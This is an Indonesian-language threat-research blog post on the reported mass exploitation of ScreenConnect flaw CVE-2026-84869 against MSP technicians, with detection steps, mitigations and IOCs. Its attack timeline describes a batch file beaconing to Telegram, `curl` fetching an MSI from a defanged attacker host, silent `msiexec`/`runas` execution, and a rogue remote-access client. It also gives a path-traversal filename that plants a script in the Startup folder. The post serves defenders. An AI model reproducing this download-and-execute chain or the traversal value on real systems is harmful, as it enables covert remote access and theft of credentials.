---
title: ScreenConnect CVE-2026-84869 - 688.000 Permintaan File Berbahaya Menunggu Teknisi MSP Bergabung
author: Thyrh07
date: 2026-11-23 08:00:00 +0700
categories: [Research]
tags: [ScreenConnect, ConnectWise, CVE-2026-84869, Huntress, MSP, RMM, Remote-Access]
excerpt: ""
---

>   **You are solely responsible for any actions or activities related to the material on this website. Some of the content here may be harmful or dangerous if misused. If you do not fully understand any material on this site, please leave. Before accessing or using these materials in any way, review the laws that apply in your province or country. All materials are provided for educational and research purposes only.**


## **<span style='color:#ff5555'>Ringkasan</span>**
***

Bukan server ScreenConnect yang dibobol — yang diserang adalah workstation teknisinya. Seorang tamu (guest) di sesi remote support bisa mendorong sebuah file ke mesin teknisi, dan klien ScreenConnect di mesin itu sendiri yang menjalankannya — tanpa prompt, tanpa konfirmasi. Cukup teknisi itu bergabung ke sesi, dan dalam sembilan detik workstation-nya sudah terpasang klien ScreenConnect palsu yang terhubung ke relay penyerang.

- **Nama:** Eksploitasi massal CVE-2026-84869 di ScreenConnect — tanpa nama kampanye resmi
- **CVE:** CVE-2026-84869, CVSS 9.9 — missing authorization di klien host ScreenConnect; tamu bisa memicu aksi transfer file yang diproses klien tanpa otorisasi, termasuk menjalankan file dengan hak elevated
- **Penemu / pelapor:** Huntress — laporan "CVE-2026-84869 in ScreenConnect Exploited to Run Malicious Files on MSP Technician Accounts" dipublikasikan 17 November 2026; diliput The Hacker News dan media keamanan pada 23 November 2026
- **Skala:** ≥688.000 permintaan guest "run file" ke 42 server ScreenConnect MSP dari 29 IP, 20 Oktober–16 November 2026; satu kompromi penuh terkonfirmasi 12 November, ditambah empat teknisi lain yang terkompromi selama Oktober menurut Huntress
- **Target:** Workstation teknisi di managed service provider (MSP) — mesin yang memegang konsol RMM, kredensial tersimpan, dan akses ke semua pelanggan
- **Fix:** Klien host dan Access agent versi 26.6.5 atau lebih baru (ConnectWise, 8 September 2026); CISA memasukkan CVE ini ke katalog KEV pada 11 September 2026
- **Status per 23 Nov 2026:** Eksploitasi aktif teramati sampai 16 November; pelaku belum teratribusi; jumlah workstation yang benar-benar terkompromi tidak diungkap penuh

> ⚠ **Klarifikasi penting:** Angka 688.000 adalah jumlah *permintaan* "run file", bukan jumlah korban — sebagian besar permintaan itu tidak pernah bertemu teknisi yang bergabung, jadi jangan dibaca sebagai 688.000 mesin terinfeksi. Kampanye ini juga **berbeda dari dua kampanye ScreenConnect lain** yang dilaporkan Huntress di periode yang sama: (1) **SCKit** (11 November) — worm yang memakai ekstensi RMM+ pihak ketiga yang rentan di sisi server dan memasang relay cookie sesi di ratusan endpoint, bukan mengeksploitasi CVE-2026-84869 secara langsung; dan (2) kampanye **sesi guest bernama bursa kripto** (13 November) — sesi tak sah di lebih dari 100 server MSP yang belum teramati melakukan aktivitas jahat lanjutan. Ketiganya menargetkan teknisi MSP yang sama, tapi mekanismenya berbeda — jangan dicampur. Satu lagi: patch sudah tersedia sejak 8 September, tapi serangan berlanjut sampai November karena banyak teknisi masih memakai klien lama (22.x, 24.2, 25.8) berminggu-minggu setelah fix rilis — update server saja tidak memperbaiki ini, karena kode yang rentan berjalan di mesin teknisi.

## **<span style='color:#ff5555'>Cara Kerja Celahnya</span>**
***

Dalam sesi ScreenConnect biasa, teknisi dan guest bisa saling bertukar file — dan normalnya teknisilah yang memutuskan apa yang berpindah dan apa yang berjalan. CVE-2026-84869 merusak asumsi itu: di sesi Support maupun Access, seorang guest bisa memicu aksi transfer file yang diproses klien host teknisi tanpa otorisasi atau konfirmasi, termasuk menjalankan file tersebut dengan hak elevated.

Yang membuat ini berbahaya bukan cuma tanpa prompt — tapi juga tanpa perlu sesi yang dibuat penyerang. Penyerang bisa menyelinap sebagai guest tambahan di sesi support nyata yang dibuat teknisi untuk pelanggan sungguhan. Dari sudut pandang teknisi, tidak ada yang aneh: ia hanya bergabung ke sesi kerja seperti biasa.

Dan targetnya dipilih dengan sengaja. Workstation teknisi MSP biasanya memegang konsol RMM, kredensial tersimpan, dan akses ke setiap pelanggan yang dikelola MSP itu. Satu workstation yang jatuh bisa menjadi jalan masuk ke puluhan organisasi pelanggan sekaligus.

## **<span style='color:#ff5555'>Kompromi Penuh dalam 9 Detik</span>**
***

Pada 12 November 2026, Huntress mengamati seorang teknisi di satu MSP bergabung ke sesi Access tanpa nama di server MSP-nya. Telemetri proses di workstation itu menunjukkan rantai berikut, dalam UTC:

| Waktu | Yang terjadi |
|---------|-----------|
| 16:46:20.7 | Klien host menjalankan file yang didorong guest, `update_224ac089.bat`, dari folder `Documents\...\Temp\`, dengan argumen `xhsdf_wrwerhjf_shhdga` |
| 16:46:21.7 | Skrip me-relaunch dirinya sendiri secara tersembunyi lewat PowerShell dan `WScript.Shell` |
| 16:46:22.2 | Skrip men-decode token bot Telegram dan chat ID dari Base64, lalu melaporkan korban baru ke operator |
| 16:46:22.6 | Rekonesans: `reg query` untuk nama dan build Windows, cek apakah klien nakal sudah terpasang, dan `net session` untuk menguji hak admin |
| 16:46:23.9 | `curl` mengunduh `hxxps://masterdarky[.]com/WindowsUpdate.msi` ke `%TEMP%\wupdate_224ac089.msi` |
| 16:46:25.8 | `msiexec /a ... TARGETDIR=%LOCALAPPDATA%\wclient_224ac089 /qn` membongkar MSI sebagai administrative image — tanpa meninggalkan catatan instalasi |
| 16:46:26.2 | `sc config seclogon start= auto` dan `net start seclogon` |
| 16:46:28.3 | `runas /trustlevel:0x20000` dan PowerShell `Start-Process` meluncurkan payload; `csc.exe` mengompilasi kode dari panggilan PowerShell `Add-Type` |
| 16:46:29.1 | `WindowsUpdate.WindowsClient.exe "h=masterdarky[.]com&p=8041&k=..."` berjalan: klien ScreenConnect yang di-rebrand, terhubung ke relay penyerang |

Sembilan detik dari file batch dijalankan sampai penyerang punya klien remote-access sendiri di mesin teknisi — yang terlihat seperti ScreenConnect legitimate dan bernama seperti Windows Update. Huntress menilai dengan keyakinan tinggi bahwa operator spray dan operator `masterdarky[.]com` adalah pihak yang sama: file `update_224ac089.bat` yang sama disemprotkan ke lima server MSP mulai dalam 2 detik yang sama pada 12 November, 43 menit sebelum kompromi itu terjadi.

## **<span style='color:#ff5555'>Spray: Ratusan Ribu Permintaan Menunggu Seseorang Bergabung</span>**
***

Kompromi di atas bukan serangan yang ditargetkan dengan presisi — ia adalah hasil dari spray buta yang menunggu keberuntungan. Di database server MSP lain, Huntress bisa melihat sisi pengirimannya:

- **688.000 permintaan "run file"** dari guest penyerang ke **42 server ScreenConnect MSP**, dari **29 IP sumber**, antara 20 Oktober dan 16 November 2026 — semuanya meminta file bernama `update.bat` atau `update_<8 hex>.bat`.
- Di server tersibuk, 10 sesi guest dari 7 IP membuat 70.414 permintaan selama tiga minggu. Guest mengulang permintaan yang sama berkali-kali, untuk berjaga-jaga kalau-kalau ada teknisi yang bergabung.
- Bagian `<8 hex>` pada nama file tampaknya adalah ID payload atau gelombang, bukan ID korban — file `update_224ac089.bat` yang sama muncul di lima server, dan gelombang sehari sebelumnya memakai `update_c99a4b29.bat`.
- Guest spray-nya tampak generik: nama sesi kosong atau hostname Windows default, versi klien guest yang diklaim sama dengan build server (25.8.3.9466 di server tersibuk), tanpa preview image atau hanya JPEG, dan sekitar separuh sesi di server tersibuk punya guest public key yang kosong. Kelima sesi yang menyemprotkan `update_224ac089.bat` — dan 27 sesi spray di 17 server — punya properti Company (`CustomProperty1`) yang diset ke `crypto client`. Itu berbeda dengan kampanye decoy bernama bursa kripto sebelumnya, yang propertinya dibiarkan kosong.

## **<span style='color:#ff5555'>Canary, Startup Folder, dan Near-Miss</span>**
***

Selain spray massal, Huntress menemukan tiga pola lain yang menunjukkan penyerang menguji dan menargetkan dengan tangan:

### 1. Canary — file marker.txt untuk menguji apakah exploit jalan

Pada 13 November pukul 01:49 UTC, seorang teknisi di MSP lain bergabung ke sesi yang tampil sebagai laptop. Guest di `91.224.92[.]167` itu sudah terhubung ulang ke server MSP tersebut sejak akhir Oktober, bahkan setelah seorang teknisi mengantrekannya untuk uninstall. Dua detik setelah teknisi bergabung, guest mendorong **marker.txt**. Sekitar tiga detik kemudian, klien teknisi menjalankannya — dan file itu terbuka di Notepad++. Tidak ada lagi yang terjadi sampai host itu offline 18 menit kemudian.

File teks tak berbahaya yang mengumumkan dirinya sendiri adalah canary klasik: ia membuktikan exploit bekerja terhadap target itu sebelum sesuatu yang nyata dikirim. IP yang sama mendorong `marker.txt` tiga kali ke teknisi di MSP ketiga pada akhir Oktober, setiap kali saat teknisi itu sedang terhubung. Guest ini tampak seperti mesin Windows bernama asli, dengan key yang tidak kosong dan screenshot — cocok dengan operator yang mengemudikannya dengan tangan, bukan spray otomatis.

### 2. Path traversal ke folder Startup teknisi

Aktivitas paling tertarget terjadi pada Oktober, di satu server MSP. Dalam tiga sesi support nyata yang dibuat teknisi untuk pelanggan selama beberapa hari, penyerang bergabung sebagai guest tambahan dan meminta klien teknisi menjalankan file berikut:

```
../../../AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/Sync.bat
```

Kalau klien menghormati path itu, skrip akan jatuh ke folder Startup teknisi dan berjalan saat logon berikutnya. Setiap dorongan dikirim saat teknisi berbeda sedang terhubung (23, 24, dan 27 Oktober), dari `193.26.115[.]63` dan `57.128.131[.]66`. Dua teknisi memakai klien Windows yang rentan, sementara yang ketiga memakai klien Mac — di mana path Startup Windows itu gagal.

### 3. Near-miss — selisih 4,3 detik

Pada 19 Oktober, guest di `91.224.92[.]83` (satu /24 yang sama dengan IP canary) mendorong `Run-Lateral.bat` tujuh kali ke teknisi dengan klien 24.2 yang rentan. Dorongan terdekat tiba 4,3 detik setelah teknisi disconnect — jadi tidak ada yang terkirim. Huntress menghitung ini sebagai near-miss, bukan exposure. Di server lain, guest di `107.148.223[.]37` mendorong `svc_payload.cmd` 207 kali; teknisi baru bergabung setelah dorongan terakhir.

## **<span style='color:#ff5555'>Deteksi dan Mitigasi</span>**
***

### 1. Patch klien teknisi sekarang — bukan cuma server

Update setiap klien host ScreenConnect teknisi ke **26.6.5 atau lebih baru**, beserta Access agent yang dicantumkan ConnectWise. Update server saja tidak memperbaiki ini, karena kode yang rentan berjalan di mesin teknisi. Riwayat koneksi server mencatat versi klien yang dipakai tiap teknisi — periksa siapa yang masih di bawah 26.6.5. Kalau belum bisa patch hari ini, cabut izin `TransferFiles` dari role dan session group, seperti yang disarankan ConnectWise.

### 2. Hunt exposure di server

Di server (`App_Data\Session.db`, kerjakan di salinannya), cari event `RanFiles` (`EventType 85`) atau `SentFiles` (86) yang dikirim koneksi guest (`ProcessType = 2`), terutama:

- Permintaan berulang untuk `update.bat` / `update_<8hex>.bat` di sesi tanpa nama
- `marker.txt`, `Run-Lateral.bat`, `svc_payload.cmd`
- Path apa pun yang mengandung `../`

Lalu periksa apakah ada koneksi Host (`ProcessType = 1`) yang sedang terbuka pada saat itu — tumpang tindih itulah exposure-nya.

### 3. Hunt di workstation teknisi

- `ScreenConnect.WindowsClient.exe` (atau klien bermerek kamu) menjalankan file `.bat`, `.cmd`, `.ps1`, `.vbs`, `.js`, atau `.txt` dari `Documents\*\Temp\`
- Apa pun di `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` yang bukan kamu yang menaruhnya, terutama `Sync.bat`
- Folder bernama `%LOCALAPPDATA%\wclient_<8hex>` dan file bernama `%TEMP%\wupdate_<8hex>.msi`
- `WindowsUpdate.WindowsClient.exe` atau klien ScreenConnect apa pun yang command line-nya menunjuk ke relay yang bukan milikmu
- Sesi guest tanpa nama yang terus-menerus meminta menjalankan `update*.bat` — hapus sesi itu, lalu cek lagi, karena mereka akan kembali

Peluang deteksi proses menurut Huntress: parent `ScreenConnect.WindowsClient.exe` → child `cmd.exe` / `powershell.exe` / `wscript.exe` / `notepad*.exe` yang command line-nya merujuk `\ScreenConnect\Temp\` dan argumen parent mengandung `RunFile`; `msiexec.exe /a` dengan `TARGETDIR=%LOCALAPPDATA%\<prefix>_<8hex>` diikuti `runas /trustlevel:0x20000`; dan koneksi relay ScreenConnect keluar (sering port 8041) ke domain yang bukan milikmu.

### 4. Kalau menemukan hit

Isolasi workstation teknisi, lalu:

- Matikan klien nakal dan hapus `%LOCALAPPDATA%\wclient_<id>` beserta `wupdate_<id>.msi`
- Kembalikan `seclogon` ke start type normalnya
- Rotate semua kredensial yang bisa dijangkau dari workstation itu: RMM, PSA, ScreenConnect, password vault, dan akun admin pelanggan
- Anggap penyerang bisa melihat semua yang bisa dilihat teknisi itu

### 5. Perkecil attack surface

- Batasi siapa yang bisa bergabung ke sesi sebagai guest, dan tinjau izin guest di sesi Support
- Batasi akses ke web interface ScreenConnect dan unduhan installer lewat IP atau VPN bila memungkinkan
- Jangan bergabung ke sesi unattended yang tidak bisa dikaitkan ke pelanggan

## **<span style='color:#ff5555'>IOC</span>**
***

| Item | Keterangan |
|------|-----------|
| `masterdarky[.]com` | Relay ScreenConnect penyerang (port 8041) dan host payload; resolve ke `194.15.36[.]33` |
| `hxxps://masterdarky[.]com/WindowsUpdate.msi` | Installer stage-2 berisi klien ScreenConnect yang di-rebrand |
| `f8871b1561d5c77c297378a7f49c84de52a01ff297395544f0e95d13ef972841` | SHA-256 `WindowsUpdate.WindowsClient.exe`, klien nakal (`h=masterdarky[.]com&p=8041`) |
| `%LOCALAPPDATA%\wclient_<8hex>\Windows Update Agent\WindowsUpdate.WindowsClient.exe` | Path instalasi klien nakal |
| `%TEMP%\wupdate_<8hex>.msi` | MSI stage-2 yang diunduh |
| `update_224ac089.bat` | Batch stage pertama yang berujung pada kompromi penuh 12 Nov |
| `xhsdf_wrwerhjf_shhdga` | Argumen yang diteruskan ke batch stage pertama |
| `update.bat`, `update_<8hex>.bat` | Nama file yang disemprotkan guest penyerang |
| `marker.txt` | File canary untuk menguji eksploitasi |
| `../../../AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/Sync.bat` | Nama file path-traversal yang didorong guest |
| `Run-Lateral.bat`, `svc_payload.cmd` | Nama file lain yang didorong guest |
| `91.224.92[.]167` | Mendorong canary `marker.txt` (guest yang dioperasikan tangan) |
| `91.224.92[.]83` | Mendorong `Run-Lateral.bat` |
| `193.26.115[.]63`, `57.128.131[.]66` | Mendorong traversal `Sync.bat` ke Startup |
| `107.148.223[.]37` | Mendorong `svc_payload.cmd` |
| `162.35.40[.]249`, `64.20.44[.]120`, `103.195.102[.]66`, `103.195.102[.]76`, `199.127.60[.]150`, `199.127.62[.]58` | Sebagian IP sprayer (daftar lengkap 29 IP ada di laporan Huntress) |

Catatan: daftar lengkap IP sprayer ada 29 alamat di laporan Huntress — tabel di atas memuat IP yang terkait langsung dengan kompromi, canary, dan traversal, plus sebagian IP sprayer. IP `74.208.158[.]106` yang sempat beredar di liputan awal tidak ada di daftar IOC Huntress, jadi tidak dimasukkan di sini.

## **<span style='color:#ff5555'>Timeline</span>**
***

| Tanggal | Peristiwa |
|---------|-----------|
| 20 Agu 2026 | Eksploitasi CVE-2026-84869 mulai teramati menurut Huntress |
| 8 Sep 2026 | ConnectWise mengungkapkan CVE-2026-84869 (CVSS 9.9); fix klien host dan Access agent 26.6.5 dirilis |
| 11 Sep 2026 | CISA memasukkan CVE-2026-84869 ke katalog KEV |
| 19–27 Okt 2026 | Near-miss `Run-Lateral.bat`, dorongan traversal `Sync.bat` ke Startup di tiga sesi nyata, dan canary `marker.txt` ke teknisi MSP ketiga |
| 20 Okt–16 Nov 2026 | Spray ≥688.000 permintaan "run file" ke 42 server MSP dari 29 IP |
| 11 Nov 2026 | Huntress membuka Rapid Response kedua untuk aktivitas worm-like SCKit (kampanye terpisah, lewat ekstensi RMM+) |
| 12 Nov 2026 | Kompromi penuh teknisi MSP terkonfirmasi — batch → bot Telegram → MSI masterdarky → klien nakal dalam ~9 detik |
| 13 Nov 2026 | Huntress melaporkan kampanye sesi guest bernama bursa kripto di 100+ server MSP (kampanye terpisah); canary `marker.txt` kedua teramati |
| 17 Nov 2026 | Huntress mempublikasikan laporan CVE-2026-84869 |
| 23 Nov 2026 | Status per postingan ini: spray teramati sampai 16 Nov; pelaku belum teratribusi; tidak ada jumlah korban penuh yang diungkap |

## **<span style='color:#ff5555'>Kesimpulan</span>**
***

ScreenConnect CVE-2026-84869 berbahaya bukan karena tekniknya paling baru — patch-nya sudah ada sejak September — melainkan karena ia menyerang titik yang paling dipercaya di rantai MSP: teknisi itu sendiri. Tidak ada phishing yang harus diklik, tidak ada server yang harus dibobol; cukup teknisi bergabung ke sesi, dan kliennya sendiri yang menjalankan file penyerang. Dan karena workstation teknisi memegang kunci ke semua pelanggan, satu kompromi sembilan detik bisa menjadi jalan masuk ke puluhan organisasi.

Tiga hal yang perlu diingat: update server tidak cukup — yang rentan adalah klien di mesin teknisi, dan banyak teknisi masih memakai versi lama berminggu-minggu setelah fix rilis; angka 688.000 adalah permintaan, bukan korban, tapi satu permintaan yang bertemu teknisi di saat yang tepat sudah cukup; dan tiga kampanye ScreenConnect di periode ini — spray CVE-2026-84869, SCKit, dan decoy bursa kripto — adalah tiga hal berbeda, jadi jangan campur IOC dan mitigasinya. Kalau kamu mengelola MSP atau memakai ScreenConnect, cek versi klien teknisi hari ini, dan hunt event `RanFiles` dari guest di server kamu.

## **<span style='color:#ff5555'>Referensi</span>**
***

- Huntress, "CVE-2026-84869 in ScreenConnect Exploited to Run Malicious Files on MSP Technician Accounts" (17 Nov 2026) — https://www.huntress.com/blog/cve-2026-84869-screenconnect-technician-exploitation
- SecurityWeek, "MSP ScreenConnect Servers Targeted in Month-Long Campaign" (17 Nov 2026) — https://www.securityweek.com/msp-screenconnect-servers-targeted-in-month-long-campaign/
- Cybersecurity Dive, "Critical flaw in ScreenConnect exploited to run malicious files on MSP technician accounts" (17 Nov 2026) — https://www.cybersecuritydive.com/news/critical-flaw-screenconnect-malicious-files-msp/874900/
- Spectrum Security, "ScreenConnect technician file-push campaign" (20 Nov 2026) — https://www.spectrum.security/threats/screenconnect-technician-file-push-campaign
